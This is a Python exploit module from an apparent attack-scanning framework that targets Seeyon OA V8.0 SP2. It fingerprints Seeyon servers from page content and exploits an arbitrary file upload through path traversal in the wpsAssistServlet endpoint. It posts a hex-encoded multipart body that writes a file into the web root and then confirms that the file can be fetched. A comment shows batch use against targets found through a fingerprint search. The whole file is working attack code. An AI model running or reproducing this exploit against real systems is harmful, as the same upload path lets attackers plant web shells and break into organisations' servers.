# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-19 20:45

from core.data import gLogger
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *
from exploit.scripts import BaseScript


# python3 batch.py -m exploit.scripts.OA.Seeyon.wpsAssistServlet_uploadfile -cs -fs "app=\"致远互联-OA\""

class Script(BaseScript):
    name = 'Seeyon'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.UPLOADFILE
        # 编号
        self.bug_number = ''
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/']
        # exec
        self.exec_path_list = ['/seeyon/wpsAssistServlet?flag=save&realFileType=/../../../ApacheJetspeed/webapps/ROOT/test.txt&fileId=1&123123=']
        # priority
        self.priority = 1
        # 相关信息
        self.info = '''version: 致远OA V8.0 SP2 版本任意文件上传'''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detect_path in self.detect_path_list:
                url = f'http://{self.target}{detect_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detect_path}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and '/seeyon/USER-DATA/IMAGES/LOGIN/login.gif' in text or '/seeyon/common/' in text or 'M3 Server' in text or 'M1-Server' in text or '/seeyon/user-data/images/login/login.gif' in text or 'seeyonproductid' in text or "ar _ctxpath = '/seeyon'" in text or 'a8-v5企业版' in text or '/seeyon/' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}

    async def exec(self):
        headers = self.headers.copy()
        headers.update({'Content-Type': 'multipart/form-data; boundary=--------1017758462'})
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{exec_path}'
                data = bytes.fromhex('2D2D2D2D2D2D2D2D2D2D313031373735383436320D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D2275706C6F6164223B66696C656E616D653D22746573742E747874220D0A436F6E74656E742D547970653A746578742F706C61696E0D0A0D0A3132330D0A2D2D2D2D2D2D2D2D2D2D313031373735383436322D2D')
                text = await AsyncFetcher.post_fetch(session=session, url=url, data=data, headers=headers, timeout=self.req_timeout)
                if '{"code":200' in text:
                    url2 = f'http://{self.target}/test.txt' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/test.txt'
                    text2 = await AsyncFetcher.fetch(session=session, url=url2, headers=headers, timeout=self.req_timeout)
                    if '123' in text2:
                        gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                        return {'name': 'Seeyon wpsAssistServlet_uploadfile', 'url': url, 'software': self.name}


if __name__ == '__main__':
    pass
